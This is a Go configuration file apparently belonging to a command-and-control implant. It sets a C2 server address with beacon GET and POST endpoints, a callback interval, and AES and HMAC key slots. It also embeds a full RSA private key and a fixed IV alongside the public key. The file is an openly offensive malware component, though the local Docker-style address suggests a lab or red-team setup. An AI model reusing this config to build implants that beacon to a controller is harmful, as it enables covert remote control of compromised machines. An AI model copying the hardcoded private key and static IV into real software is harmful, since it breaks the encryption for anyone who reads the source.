package config

import (
	"time"
)

var (
	RsaPublicKey = []byte(`
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCrYBSkS5ADpqJbe+PjCHE7SJaTavhqKaWui1zk
iQoIvcs+QVaQ5sqbNd3l9HnQxNlt8gS+1m3Hpbe34s8klDVfOxb3mer3sJb/C4q/3AS0UKdn4kNM
oakC9UBoNYerfSQB+jqjEiVeTMls8neoh12JyLXI6e61CzeiChpyTWTFjwIDAQAB
-----END PUBLIC KEY-----
	`)
	RsaPrivateKey = []byte(`
-----BEGIN PRIVATE KEY-----
MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGBAKtgFKRLkAOmolt74+MIcTtIlpNq
+Goppa6LXOSJCgi9yz5BVpDmyps13eX0edDE2W3yBL7Wbcelt7fizySUNV87FveZ6vewlv8Lir/c
BLRQp2fiQ0yhqQL1QGg1h6t9JAH6OqMSJV5MyWzyd6iHXYnItcjp7rULN6IKGnJNZMWPAgMBAAEC
gYA0NxIS/PLkKeFN/nFwuyHE7ljykaUes5HHnK6w8xAbmbhTP5UgkTEqGT+C0PpMoa2d0h+gBbVt
HxDa9kAm5QFdgpXQjWJVfVCnZAnEZiwYHaR5UKcj3h7iZJW1NsNKjIo9tZhC0GAVX5k9t3tpDOOY
F7qAdYTPsioAiDJdHWfAAQJBAOMPG3v/ZbsrOGW4/OmaY9E+3wtnh8bjSCagFie+1Wt1kLK150sy
MBe87e6v9wWxxNYQLsGOlOh7DXsmwMevlT8CQQDBOAZVEAvPMDp8KdvEqlYdz5/z+xh6vLKOuj8F
rOwFG3B2AYx8qAelrpT0R0a7w+kcQTCENJJNe+4r1n9E0yuxAkBAr/oljnJ+K2cK2/P53YlYgK/s
wNcW24OftXX6ZszIq5rIvzgg3TCEYsfqe2lFzwqD7eJUNHnJ7dy+XCEKAsTjAkByW/t7eyzSK0Ri
WtAFXZ/ssweD+1joxCiWy2sjq85h03TDk3UYDse/602kK0+VMIYXQAo8JXV2QOSds63OCYJxAkAx
XWStz7RTsTUyD5h50Js4bJd91EFOCb85LpJP4xKX+G5N2wDcmnbyx+Zym7UuDAtgDWY8Nwd9079w
/irLk+db
-----END PRIVATE KEY-----
	`)


	C2        = "172.17.0.1:1337"
	plainHTTP = "http://"
	sslHTTP   = "https://"
	GetUrl    = plainHTTP + C2 + "/api/v1/status"
	PostUrl   = plainHTTP + C2 + "/api/v1/entry?id="
	WaitTime  = 10000 * time.Millisecond
	VerifySSLCert = true
	TimeOut time.Duration  = 10 //seconds

	IV        = []byte("abcdefghijklmnop")
	GlobalKey []byte
	AesKey    []byte
	HmacKey   []byte
	Counter   = 0
)

const (
	DebugMode = true
)
